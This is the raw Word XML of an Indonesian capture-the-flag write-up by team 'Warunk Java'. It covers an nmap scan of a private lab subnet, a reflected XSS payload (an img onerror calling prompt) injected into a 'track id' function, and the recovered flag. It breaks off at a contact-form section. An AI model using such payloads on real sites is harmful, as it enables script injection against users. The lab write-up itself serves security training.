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37B3" w14:textId="2E054E36" w:rsidR="00220D9C" w:rsidRPr="00F970FE" w:rsidRDefault="00220D9C" w:rsidP="00220D9C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Bodoni Bd BT" w:hAnsi="Bodoni Bd BT" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="C00000"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F970FE">
        <w:rPr>
          <w:rFonts w:ascii="Bodoni Bd BT" w:hAnsi="Bodoni Bd BT" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">CAPTURE THE </w:t>
      </w:r>
      <w:r w:rsidRPr="00F970FE">
        <w:rPr>
          <w:rFonts w:ascii="Bodoni Bd BT" w:hAnsi="Bodoni Bd BT" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="C00000"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>FLAG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264E59ED" w14:textId="4F6114D0" w:rsidR="00220D9C" w:rsidRPr="00FD2FF1" w:rsidRDefault="00220D9C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Nama </w:t>
      </w:r>
      <w:r w:rsidR="00ED12E2" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>eam:</w:t>
      </w:r>
      <w:r w:rsidR="009C6AA3" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006866F4" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="00A13B31" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">arunk </w:t>
      </w:r>
      <w:r w:rsidR="006866F4" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78EEBF52" w14:textId="2B45D786" w:rsidR="009A63AA" w:rsidRPr="00FD2FF1" w:rsidRDefault="009A63AA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Engineer:</w:t>
      </w:r>
      <w:r w:rsidR="009C6AA3" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Abdurrohman Al Fathi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111B2B44" w14:textId="77777777" w:rsidR="00013C56" w:rsidRPr="00FD2FF1" w:rsidRDefault="00013C56" w:rsidP="00013C56">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B56AF5A" w14:textId="5A578474" w:rsidR="00BB5B42" w:rsidRPr="00FD2FF1" w:rsidRDefault="00783907" w:rsidP="006814F3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Proses scanning dengan nmap </w:t>
      </w:r>
      <w:r w:rsidR="00301E1C" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">secara </w:t>
      </w:r>
      <w:r w:rsidR="004522ED" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">keseluruhan host pada segment  192.168.56.0/24 </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">untuk </w:t>
      </w:r>
      <w:r w:rsidR="00F757F5" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mengetahui port mana saja yang terbuka</w:t>
      </w:r>
      <w:r w:rsidR="00B910F3" w:rsidRPr="00FD2FF1">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8821B5" w14:textId="414A968F" w:rsidR="006A6D18" w:rsidRDefault="0069520E" w:rsidP="006952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Comand: nmap -sV  192.168.</w:t>
      </w:r>
      <w:r w:rsidR="00992717">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>56.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70896C72" w14:textId="698DC96F" w:rsidR="009C7C07" w:rsidRDefault="009C7C07" w:rsidP="009C7C07">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6BE2A2B8" wp14:editId="5949CBF9">
            <wp:extent cx="5950585" cy="3446585"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="21769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43" cy="347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6184" w14:textId="45A1CC70" w:rsidR="00C67643" w:rsidRDefault="00C43EE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Terdapat </w:t>
      </w:r>
      <w:r w:rsidR="004A4836">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r w:rsidR="00C64B87">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> host yang aktif</w:t>
      </w:r>
      <w:r w:rsidR="000173EE">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00C64B87">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001E6BF8">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>port 80 dan 22</w:t>
      </w:r>
      <w:r w:rsidR="006C3414">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A78749C" w14:textId="2F1D65B2" w:rsidR="006C3414" w:rsidRDefault="00A24C1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&gt;192.168.56.108</w:t>
      </w:r>
      <w:r w:rsidR="00610577">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F6C82B" w14:textId="6A1E9940" w:rsidR="00B910F3" w:rsidRDefault="00F955B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&gt;</w:t>
      </w:r>
      <w:r w:rsidR="006C3414">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.168.56.107</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA0C9F2" w14:textId="77777777" w:rsidR="00C4165D" w:rsidRDefault="00C4165D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53CBB468" w14:textId="77777777" w:rsidR="00C4165D" w:rsidRDefault="00C4165D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44DF23CA" w14:textId="77777777" w:rsidR="0081464C" w:rsidRDefault="0081464C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06B579CB" w14:textId="3E43AA0A" w:rsidR="00991E6C" w:rsidRDefault="000B4147">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Dari </w:t>
      </w:r>
      <w:r w:rsidR="005956A1" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">semua </w:t>
      </w:r>
      <w:r w:rsidR="007B44AE" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ip yang muncul </w:t>
      </w:r>
      <w:r w:rsidR="00E75C04" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ketika dicek </w:t>
      </w:r>
      <w:r w:rsidR="00964574" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">di </w:t>
      </w:r>
      <w:r w:rsidR="00EC60FE" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">search engine </w:t>
      </w:r>
      <w:r w:rsidR="00E75C04" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ternyata ip web </w:t>
      </w:r>
      <w:r w:rsidR="00735B03" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CTF nya </w:t>
      </w:r>
      <w:r w:rsidR="00E75C04" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">terdapat di </w:t>
      </w:r>
      <w:r w:rsidR="00194142" w:rsidRPr="0020788B">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:r w:rsidR="00E75C04">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005956A1">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00C4165D">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00183B7F">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192.168.56.107</w:t>
      </w:r>
      <w:r w:rsidR="006814F3">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006D5DBF">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:ins w:id="0" w:author="Microsoft Word" w:date="2024-02-29T23:03:00Z">
        <w:r w:rsidR="006D5DBF">
          <w:rPr>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http:</w:t>
        </w:r>
        <w:r w:rsidR="00DB35FC">
          <w:rPr>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>//192.168.56.107</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="48F6AEFF" w14:textId="6300889F" w:rsidR="0081464C" w:rsidRDefault="00856828" w:rsidP="0081464C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00856828">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70A2F722" wp14:editId="2F7FFE7A">
            <wp:extent cx="5842000" cy="2558415"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="44651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17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628" cy="26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66AB" w14:textId="77777777" w:rsidR="0081464C" w:rsidRDefault="0081464C" w:rsidP="00901B5E">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E61011E" w14:textId="3C42547B" w:rsidR="004D61BE" w:rsidRPr="00CE1135" w:rsidRDefault="0081464C" w:rsidP="00E840E7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00451516" w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">idapati celah pada function track id </w:t>
      </w:r>
      <w:r w:rsidR="00290E67" w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>setelah</w:t>
      </w:r>
      <w:r w:rsidR="005913FA" w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> di</w:t>
      </w:r>
      <w:r w:rsidR="00A94E13" w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>masukan payload</w:t>
      </w:r>
      <w:r w:rsidR="004D5EC9" w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(xss</w:t>
      </w:r>
      <w:r w:rsidR="008E3D80" w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> script js)</w:t>
      </w:r>
      <w:r w:rsidR="004D61BE" w:rsidRPr="00CE1135">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ini:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC67331" w14:textId="77777777" w:rsidR="00901B5E" w:rsidRDefault="00901B5E" w:rsidP="00E840E7">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="161B22"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6EDF3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&lt;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img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src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onerror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=</w:t>
      </w:r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prompt(</w:t>
      </w:r>
      <w:proofErr w:type="gram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8)&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACA7FFC" w14:textId="7C5C838F" w:rsidR="00D54610" w:rsidRPr="00BE644E" w:rsidRDefault="005920D0" w:rsidP="00BE644E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005616E3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Ketika di inspect </w:t>
      </w:r>
      <w:r w:rsidR="00316E83" w:rsidRPr="005616E3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">dan dibuka di </w:t>
      </w:r>
      <w:r w:rsidR="0008331D" w:rsidRPr="005616E3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00316E83" w:rsidRPr="005616E3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>onsole terdapat flag</w:t>
      </w:r>
      <w:r w:rsidR="00CA0DF4">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00D54610" w:rsidRPr="00625AAB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(XSS)</w:t>
      </w:r>
      <w:r w:rsidR="005A49CB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> FLAG</w:t>
      </w:r>
      <w:r w:rsidR="00BE644E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EE0D07" w14:textId="15DA432A" w:rsidR="00451516" w:rsidRPr="00BE644E" w:rsidRDefault="00316E83" w:rsidP="00BE644E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D54610">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FLAG(</w:t>
      </w:r>
      <w:r w:rsidR="00CF664A" w:rsidRPr="00D54610">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Javascript_ezpz)</w:t>
      </w:r>
      <w:r w:rsidR="00F526BF" w:rsidRPr="00D54610">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">               </w:t>
      </w:r>
      <w:r w:rsidR="00603A77" w:rsidRPr="00D54610">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A08FA0" w14:textId="77777777" w:rsidR="0081464C" w:rsidRDefault="00BA1307" w:rsidP="0081464C">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E594FC6" wp14:editId="7E1EEB97">
            <wp:extent cx="6019800" cy="2647950"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="206693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64" cy="269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0ACF" w14:textId="77777777" w:rsidR="001802A6" w:rsidRDefault="001802A6" w:rsidP="0081464C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A9D183A" w14:textId="77777777" w:rsidR="00B87474" w:rsidRDefault="00B87474" w:rsidP="0081464C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55F1A27D" w14:textId="77777777" w:rsidR="00B87474" w:rsidRDefault="00B87474" w:rsidP="0081464C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62A699BD" w14:textId="47B716C7" w:rsidR="005F2078" w:rsidRPr="0081464C" w:rsidRDefault="00B3426B" w:rsidP="0081464C">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/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celah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pada menu contact</w:t>
      </w:r>
      <w:r w:rsidR="00095111">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Kita </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>akan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>menggunakan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
